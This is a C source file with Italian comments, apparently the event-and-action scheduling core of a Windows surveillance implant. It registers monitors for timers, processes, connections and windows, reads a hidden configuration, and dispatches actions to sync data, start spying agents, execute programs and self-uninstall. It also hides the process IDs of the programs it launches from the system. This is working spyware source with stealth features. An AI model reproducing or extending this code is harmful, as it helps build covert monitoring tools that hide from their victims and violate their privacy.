#include <windows.h>
#include "common.h"
#include "H4-DLL.h"
#include "demo_functions.h"
#include "UnHookClass.h"
#include "DeepFreeze.h"
#include "x64.h"
#include "status_log.h"
#include "SM_Core.h"
#include "SM_ActionFunctions.h"
#include "SM_EventHandlers.h"


// Il sistema si basa su condizioni->eventi->azioni
// Un event monitor, quando si verifica una condizione, genera un evento. Le condizioni sono verificate a discrezione
// dell'event monitor (EM)stesso in base al Param passato alla funzione pEventMonitorAdd. 
// Quando una condizione si verifica, l'EM richiama TriggerEvent. Il SyncManager monitora gli eventi e, quando ne
// rileva uno, esegue le azioni associate nella sua tabella eventi/azioni.


#define MAX_EVENT_MONITOR 15 // Massimo numero di event monitor registrabili
#define MAX_DISPATCH_FUNCTION 15 // Massimo numero di azioni registrabili
#define SYNCM_SLEEPTIME 100

typedef void (WINAPI *EventMonitorAdd_t) (BYTE *, DWORD, event_param_struct *, DWORD);
typedef void (WINAPI *EventMonitorStart_t) (void);
typedef void (WINAPI *EventMonitorStop_t) (void);
typedef BOOL (WINAPI *ActionFunc_t) (BYTE *, DWORD);

ActionFunc_t ActionFuncGet(DWORD action_type, BOOL *is_fast_action);


// Gestione event monitor  ----------------------------------------------

typedef struct  {
	DWORD event_type;
	EventMonitorAdd_t pEventMonitorAdd;
	EventMonitorStart_t pEventMonitorStart;
	EventMonitorStop_t pEventMonitorStop;
} event_monitor_elem;

// Struttura per gestire i thread di ripetizione
typedef struct {
	DWORD event_id;
	DWORD repeat_action;
	DWORD count; 
	DWORD delay;
	BOOL  semaphore;
} repeated_event_struct;

// Struttura della tabella degli eventi
typedef struct {
	BOOL event_enabled;
	repeated_event_struct repeated_event;
	HANDLE repeated_thread;
} event_table_struct;

// Tabella degli event monitor attualmente registrati
DWORD event_monitor_count = 0;
event_monitor_elem event_monitor_array[MAX_EVENT_MONITOR];

// Tabella contenente lo stato di attivazione di tutti gli eventi nel file di configurazione
event_table_struct *event_table = NULL;
DWORD event_count = 0;

DWORD WINAPI RepeatThread(repeated_event_struct *repeated_event) {
	DWORD i = 0;
	LOOP {
		CANCELLATION_SLEEP(repeated_event->semaphore, repeated_event->delay);
		if (i < repeated_event->count) {
			i++;
			TriggerEvent(repeated_event->repeat_action, repeated_event->event_id);
		}
	}
	return 0;
}

// Permette di gestire i repeat degli eventi
void CreateRepeatThread(DWORD event_id, DWORD repeat_action, DWORD count, DWORD delay)
{
	DWORD dummy;

	// Non c'e' nessuna azione da fare
	if (repeat_action == AF_NONE || count == 0 || delay<1000)
		return;
	// L'evento non e' riconosciuto
	if (event_id >= event_count)
		return;
	// C'e' gia' un thread attivo per quell'evento
	if (event_table[event_id].repeated_thread)
		return;

	event_table[event_id].repeated_event.count = count;
	event_table[event_id].repeated_event.delay = delay;
	event_table[event_id].repeated_event.event_id = event_id;
	event_table[event_id].repeated_event.repeat_action = repeat_action;
	event_table[event_id].repeated_event.semaphore = FALSE;

	event_table[event_id].repeated_thread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RepeatThread, &event_table[event_id].repeated_event, 0, &dummy);
}

void StopRepeatThread(DWORD event_id)
{
	// L'evento non e' riconosciuto
	if (event_id >= event_count)
		return;

	QUERY_CANCELLATION(event_table[event_id].repeated_thread, event_table[event_id].repeated_event.semaphore);
}

// Registra un nuovo event monitor
void EventMonitorRegister(DWORD event_type, EventMonitorAdd_t pEventMonitorAdd, 
						  EventMonitorStart_t pEventMonitorStart,
						  EventMonitorStop_t pEventMonitorStop)
{
	if (event_monitor_count >= MAX_EVENT_MONITOR)
		return;

	event_monitor_array[event_monitor_count].event_type = event_type;
	event_monitor_array[event_monitor_count].pEventMonitorAdd = pEventMonitorAdd;
	event_monitor_array[event_monitor_count].pEventMonitorStop = pEventMonitorStop;
	event_monitor_array[event_monitor_count].pEventMonitorStart = pEventMonitorStart;

	event_monitor_count++;
}

void EventMonitorStartAll()
{
	DWORD i;
	for (i=0; i<event_monitor_count; i++)
		event_monitor_array[i].pEventMonitorStart();
}

void EventMonitorStopAll()
{
	DWORD i;
	for (i=0; i<event_monitor_count; i++)
		event_monitor_array[i].pEventMonitorStop();
}

void EventTableInit()
{
	SAFE_FREE(event_table);
	event_count = 0;
}

// Setta lo stato iniziale di un evento
void SM_EventTableState(DWORD event_id, BOOL state)
{
	event_table_struct *temp_event_table;
	// Alloca la tabella per contenere quel dato evento 
	// La tabella e' posizionale
	if (event_id >= event_count) {
		temp_event_table = (event_table_struct *)realloc(event_table, (event_id + 1) * sizeof(event_table_struct));
		if (!temp_event_table)
			return;
		event_table = temp_event_table;
		event_count = event_id + 1;
		event_table[event_id].repeated_thread = NULL;
		ZeroMemory(&event_table[event_id].repeated_event, sizeof(repeated_event_struct));
	}
	event_table[event_id].event_enabled = state;
}

// Assegna una riga "evento" della configurazione al corretto event monitor
void EventMonitorAddLine(DWORD event_type, BYTE *param, DWORD param_len, event_param_struct *event_param, DWORD event_id, BOOL event_state)
{
	DWORD i;
	// Inizializza lo stato attivo/disattivo dell'evento
	SM_EventTableState(event_id, event_state);

	for (i=0; i<event_monitor_count; i++)
		if (event_monitor_array[i].event_type == event_type) {
			event_monitor_array[i].pEventMonitorAdd(param, param_len, event_param, event_id);
			break;
		}
}

BOOL EventIsEnabled(DWORD event_id)
{
	// L'evento non e' mai stato visto e inizializzato
	if (event_id >= event_count)
		return FALSE;

	return event_table[event_id].event_enabled;
}
//------------------------------------------------------------------




// Tabella delle actions ------------------------------------------

typedef struct {
	ActionFunc_t pActionFunc; // Puntatore alla funzione che effettua l'action
	BYTE *param;              // Puntatore all'array contenente i parametri
	DWORD param_len;
} action_elem;

typedef struct {
	DWORD subaction_count; // numero di azioni collegate all'evento 
	action_elem *subaction_list; // puntatore all'array delle azioni 
	BOOL is_fast_action; // e' TRUE se non contiene alcuna sottoazione lenta (sync, uninst e execute)
	BOOL triggered; // Se l'evento e' triggerato o meno
} event_action_elem;

static event_action_elem *event_action_array = NULL; // Puntatore all'array dinamico contenente le actions.
                                                     // Si chiude con una entry nulla.
static DWORD event_action_count = 0; // Numero di elementi nella tabella event/actions

// Funzione da esportare (per eventuali event monitor esterni o per far generare eventi anche 
// agli agents). Triggera l'evento "index". L'event_id indica quale evento sta triggerando l'azione.
// Se l'evento e' stato disabilitato, l'azione non e' triggerata
void TriggerEvent(DWORD index, DWORD event_id)
{
	// Se e' uguale ad AF_NONE sara' sicuramente > event_action_count
	if (index >= event_action_count)
		return;

	// L'azione viene effettivamente triggerata solo se l'evento che l'ha generata
	// e' attivo in quel momento
	if (EventIsEnabled(event_id))
		event_action_array[index].triggered = TRUE;
}

// Cerca un evento qualsiasi che e' stato triggerato. Se lo trova torna TRUE e valorizza
// il puntatore all'array delle relative actions e il numero delle actions stesse.
// Legge solo le azioni lente
BOOL ReadEventSlow(DWORD *event_id)
{
	static DWORD i = 0;

	for (; i<event_action_count; i++) 
		if (event_action_array[i].triggered && !event_action_array[i].is_fast_action) {
			event_action_array[i].triggered = FALSE;
			*event_id = i;
			// Evita che lo stesso evento possa 
			// essere triggerato continuamente	
			i++; 
			return TRUE;
		}

	i = 0;
	return FALSE;
}

// Legge solo azioni veloci
BOOL ReadEventFast(DWORD *event_id)
{
	static DWORD i = 0;

	for (; i<event_action_count; i++) 
		if (event_action_array[i].triggered && event_action_array[i].is_fast_action) {
			event_action_array[i].triggered = FALSE;
			*event_id = i;
			// Evita che lo stesso evento possa 
			// essere triggerato continuamente	
			i++; 
			return TRUE;
		}

	i = 0;
	return FALSE;
}

// Esegue le actions indicate
void DispatchEvent(DWORD event_id)
{
	DWORD i;

	// Se l'action torna TRUE (es: nuova configurazione), smette di eseguire
	// sottoazioni che potrebbero non esistere piu'
	for (i=0; i<event_action_array[event_id].subaction_count; i++) {
		if (event_action_array[event_id].subaction_list[i].pActionFunc) {
			if (event_action_array[event_id].subaction_list[i].pActionFunc(event_action_array[event_id].subaction_list[i].param, event_action_array[event_id].subaction_list[i].param_len))
				break;
		}
	}
}


// Aggiunge una sotto-azione per l'evento "event_number" 
// Torna FALSE solo se ha inserito con successo una azione slow
BOOL ActionTableAddSubAction(DWORD event_number, DWORD subaction_type, BYTE *param, DWORD param_len)
{
	void *temp_action_list;
	BOOL is_fast_action;
	DWORD subaction_count;

	// Se l'evento non esiste nella event_action table ritorna
	if (event_number >= event_action_count)
		return TRUE;

	// All'inizio subaction_list e subaction_count sono a 0 perche' azzerate nella ActionTableInit
	// XXX si, c'e' un int overflow se ci sono 2^32 sotto azioni che potrebbe portare a un exploit nello heap (es: double free)....
	temp_action_list = realloc(event_action_array[event_number].subaction_list, sizeof(action_elem) * (event_action_array[event_number].subaction_count + 1) );

	// Se non riesce ad aggiungere la nuova sottoazione lascia tutto com'e'
	if (!temp_action_list)
		return TRUE;

	// Se l'array delle sottoazioni e' stato ampliato con successo, incrementa il numero delle sottoazioni
	// e aggiunge la nuova subaction
	subaction_count = event_action_array[event_number].subaction_count++;
	event_action_array[event_number].subaction_list = (action_elem *)temp_action_list;
	event_action_array[event_number].subaction_list[subaction_count].pActionFunc = ActionFuncGet(subaction_type, &is_fast_action);

	if (param_len) 
		event_action_array[event_number].subaction_list[subaction_count].param = (BYTE *)malloc(param_len);
	else
		event_action_array[event_number].subaction_list[subaction_count].param = NULL;

	// Effettua la copia solo se il parametro ha lunghezza > 0 ed e' stato allocato correttamente.
	// altrimenti setta a 0 la lunghezza.
	if (event_action_array[event_number].subaction_list[subaction_count].param) {
		memcpy(event_action_array[event_number].subaction_list[subaction_count].param, param, param_len);
		event_action_array[event_number].subaction_list[subaction_count].param_len = param_len;
	} else
		event_action_array[event_number].subaction_list[subaction_count].param_len = 0;

	return is_fast_action;
}



// Quando questa funzione viene chiamata non ci devono essere thread attivi 
// che possono chiamare la funizone TriggerEvent. Dovrei proteggerlo come CriticalSection
// ma mi sembra sprecato in questo contesto (basta solo fare un po' di attenzione se si dovesse
// verificare il caso).
void ActionTableInit(DWORD number)
{
	DWORD i,j;
	event_action_elem *temp_event_action_array = NULL;

	// Libera gli eventuali parametri allocati nella precedente configurazione
	for (i=0; i<event_action_count; i++) {
		for (j=0; j<event_action_array[i].subaction_count; j++)
			SAFE_FREE(event_action_array[i].subaction_list[j].param);

		SAFE_FREE(event_action_array[i].subaction_list);
	}

	// Alloca una nuova tabella
	if (number)
		temp_event_action_array = (event_action_elem *)realloc(event_action_array, number * sizeof(event_action_elem));

	if (temp_event_action_array) {
		event_action_count = number;
		event_action_array = temp_event_action_array;
		ZERO(event_action_array, number * sizeof(event_action_elem));
		for (i=0; i<event_action_count; i++) 
			event_action_array[i].is_fast_action = TRUE; // all'inizio conta tutte come fast actions
	} else {
		event_action_count = 0;
		SAFE_FREE(event_action_array);
		return;
	}
}

//----------------------------------------------------------------






// Gestione delle action function registrate -----------------------------------------------------------
typedef struct {
	DWORD action_type;
	ActionFunc_t pActionFunc;
	BOOL is_fast_action;
} dispatch_func_elem;


// Tabella delle azioni di default
DWORD dispatch_func_count = 0;
dispatch_func_elem dispatch_func_array[MAX_DISPATCH_FUNCTION];


// Registra un'action
void ActionFuncRegister(DWORD action_type, ActionFunc_t pActionFunc, BOOL is_fast_action)
{
	if (dispatch_func_count >= MAX_DISPATCH_FUNCTION)
		return;

	dispatch_func_array[dispatch_func_count].action_type = action_type;
	dispatch_func_array[dispatch_func_count].pActionFunc = pActionFunc;
	dispatch_func_array[dispatch_func_count].is_fast_action = is_fast_action;

	dispatch_func_count++;
}


// Ritorna il puntatore alla funzione di action associata ad un certo action_type
ActionFunc_t ActionFuncGet(DWORD action_type, BOOL *is_fast_action)
{
	DWORD i;

	for (i=0; i<dispatch_func_count; i++)
		if (dispatch_func_array[i].action_type == action_type) {
			if (is_fast_action)
				*is_fast_action = dispatch_func_array[i].is_fast_action;
			return dispatch_func_array[i].pActionFunc;
		}

	return NULL;
}

//-----------------------------------------------------------------------------------


// Istruisce gli EM per il monitor degli eventi e popola l'action table sulla base 
// del file di configurazione

// Struttura del file di configurazione:
// DWORD condition_count = numero delle condizioni 
// Per ogni monitor:
//     DWORD tag = identificativo handler
//     DWORD event_id = evento da scatenare
//     DWORD param_len = lunghezza parametro
//     BYTE param[] = parametro
// DWORD action_count = numero delle azioni (coincidente col numero degli eventi)
// Per ogni action
//     DWORD subaction_count = numero delle sottoazioni
//     Per ogni sottoazione
//        DWORD tag = identificativo action function
//        DWORD param_len = lunghezza parametro
//        BYTE param[] = parametro
     

void UpdateEventConf()
{
	BYTE *conf_memory;
	DWORD event_id = 0;
	event_param_struct event_param;

	conf_memory = HM_ReadClearConf(H4_CONF_FILE);

	// Effettua il parsing del file di configurazione mappato
	// XXX Non c'e' il controllo che conf_ptr possa uscire fuori dalle dimensioni del file mappato
	// (viene assunto che la configurazione sia coerente e il file integro)
	if (conf_memory) {
		DWORD index, condition_count, action_count, subaction_count, tag, action_id, event_status, param_len;
		BYTE *conf_ptr;

		// conf_ptr si sposta nel file durante la lettura
		conf_ptr = (BYTE *)HM_memstr((char *)conf_memory, EVENT_CONF_DELIMITER);

		// ---- Condizioni ----
		READ_DWORD(condition_count, conf_ptr);
		EventTableInit();
		for (index=0; index<condition_count; index++) {
			READ_DWORD(tag, conf_ptr);
			READ_DWORD(action_id, conf_ptr);
			READ_DWORD(param_len, conf_ptr);

			ZeroMemory(&event_param, sizeof(event_param));
			event_param.start_action = action_id;
			event_param.stop_action = AF_NONE;
			event_param.repeat_action = AF_NONE;
			event_param.delay = 0;
			event_param.count = 0;
			event_status = TRUE;
	
			EventMonitorAddLine(tag, conf_ptr, param_len, &event_param, event_id++, event_status);
			conf_ptr += param_len;
		}

		// ---- Azioni ----
		READ_DWORD(action_count, conf_ptr);
		ActionTableInit(action_count);
		for (index=0; index<action_count; index++) {
			READ_DWORD(subaction_count, conf_ptr);
			for (;subaction_count>0; subaction_count--) {
				READ_DWORD(tag, conf_ptr);
				READ_DWORD(param_len, conf_ptr);
				// Se ha aggiunto una subaction "slow" marca tutta l'action come slow
				// Basta una subaction slow per marcare tutto l'action
				if (!ActionTableAddSubAction(index, tag, conf_ptr, param_len)) 
					event_action_array[index].is_fast_action = FALSE;
				conf_ptr += param_len;
			}
		}

		SAFE_FREE(conf_memory);
	}
}


// Lista dei processi eseguiti
DWORD *process_executed = NULL;
#define MAX_PROCESS_EXECUTED 512
// Gestisce la lista dei processi eseguiti. Quando un processo
// non esiste piu' elimina l'hiding per il PID corrispondente.
void SM_HandleExecutedProcess()
{
	DWORD i;
	char *proc_name;
	pid_hide_struct pid_hide = NULL_PID_HIDE_STRUCT;

	// Questa funzione viene richiamata prima che possa essere 
	// eseguita SM_AddExecutedProcess: quindi e' questa che si 
	// preoccupa di inizializzare l'array dei PID
	if (!process_executed) {
		process_executed = (DWORD *)calloc(MAX_PROCESS_EXECUTED, sizeof(DWORD));
		return;
	}

	// Cicla la lista dei processi eseguiti
	for (i=0; i<MAX_PROCESS_EXECUTED; i++)
		if (process_executed[i]) {
			proc_name = HM_FindProc(process_executed[i]);
			// Se ora il PID non esiste piu' elimina l'hide
			// e lo toglie dalla lista.
			if (!proc_name) {
				SET_PID_HIDE_STRUCT(pid_hide, process_executed[i]);
				AM_RemoveHide(HIDE_PID, &pid_hide);
				process_executed[i] = 0;
			}
			SAFE_FREE(proc_name);
		}
}


// Aggiunge un processo alla lista di quelli eseguiti come azione
// Ne effettua anche l'hiding
void SM_AddExecutedProcess(DWORD pid)
{
	DWORD i;
	pid_hide_struct pid_hide = NULL_PID_HIDE_STRUCT;

	// Nasconde il PID passato
	SET_PID_HIDE_STRUCT(pid_hide, pid);
	AM_AddHide(HIDE_PID, &pid_hide);

	// Aggiorna la lista dei PID eseguiti (se e' allocata)
	if (!process_executed)
		return;

	// Cerca un posto libero e inserisce il PID
	for (i=0; i<MAX_PROCESS_EXECUTED; i++)
		if (!process_executed[i]) {
			process_executed[i] = pid;
			break;
		}
}

// Loop di gestione delle azioni FAST
DWORD WINAPI FastActionsThread(DWORD dummy)
{
	DWORD event_id;
	LOOP {
		CANCELLATION_POINT(bInstantActionThreadSemaphore);
		if (ReadEventFast(&event_id)) 
			DispatchEvent(event_id);
		else
			Sleep(SYNCM_SLEEPTIME);

	}
	return 0;
}

// Ciclo principale di monitoring degli eventi. E' praticamente il ciclo principale di tutto il client core.
void SM_MonitorEvents(DWORD dummy)
{
	DWORD event_id;
	DWORD dummy2;

	InitializeCriticalSection(&action_critic_sec);

	// Registrazione degli EM e delle AF. 
	EventMonitorRegister(EM_TIMER, EM_TimerAdd, EM_TimerStart, EM_TimerStop);
	EventMonitorRegister(EM_PROCMON, EM_MonProcAdd, EM_MonProcStart, EM_MonProcStop);
	EventMonitorRegister(EM_CONNMON, EM_MonConnAdd, EM_MonConnStart, EM_MonConnStop);
	EventMonitorRegister(EM_SCREENS, EM_ScreenSaverAdd, EM_ScreenSaverStart, EM_ScreenSaverStop);	
	EventMonitorRegister(EM_WINEVEN, EM_MonEventAdd, EM_MonEventStart, EM_MonEventStop);	
	EventMonitorRegister(EM_QUOTA, EM_QuotaAdd, EM_QuotaStart, EM_QuotaStop);	
	EventMonitorRegister(EM_NEWWIN, EM_NewWindowAdd, EM_NewWindowStart, EM_NewWindowStop);	

	ActionFuncRegister(AF_SYNCRONIZE, DA_Syncronize, FALSE);
	ActionFuncRegister(AF_STARTAGENT, DA_StartAgent, TRUE);
	ActionFuncRegister(AF_STOPAGENT, DA_StopAgent, TRUE);
	ActionFuncRegister(AF_EXECUTE, DA_Execute, FALSE);
	ActionFuncRegister(AF_UNINSTALL, DA_Uninstall, FALSE);
	ActionFuncRegister(AF_LOGINFO, DA_LogInfo, TRUE);
	ActionFuncRegister(AF_STARTEVENT, DA_StartEvent, TRUE);
	ActionFuncRegister(AF_STOPEVENT, DA_StopEvent, TRUE);

	// Legge gli eventi e le azioni dal file di configurazione. 
	// Deve essere sempre posizionato DOPO la registrazione di EM e AF
	UpdateEventConf();
	EventMonitorStartAll();

	// Lancia il thread che gestira' gli eventi FAST
	hInstantActionThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)FastActionsThread, NULL, 0, &dummy2);

	// Ciclo principale di lettura degli eventi
	LOOP {
		// Gestisce la lista dei processi eseguiti
		// (va eseguita per prima nel loop).
		SM_HandleExecutedProcess();

		if (ReadEventSlow(&event_id)) 
			DispatchEvent(event_id);
		else
			Sleep(SYNCM_SLEEPTIME);
	}
}

void SM_StartMonitorEvents(void)
{
	DWORD dummy;
	HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SM_MonitorEvents, NULL, 0, &dummy);
}
